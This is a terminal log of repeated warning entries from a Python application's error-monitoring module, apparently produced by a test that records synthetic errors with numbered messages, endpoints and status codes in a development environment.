WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1618'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773266Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1619'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1620'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773377Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1621'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1622'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1623'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773529Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1624'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773578Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1625'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1626'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773685Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1627'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1628'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1629'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773839Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1630'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1631'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773943Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1632'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773992Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1633'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1634'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774188Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1635'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1636'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774378Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1637'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774434Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1638'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1639'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1640'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774590Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1641'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774646Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774850Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.774947Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775226Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775329Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775378Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775475Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
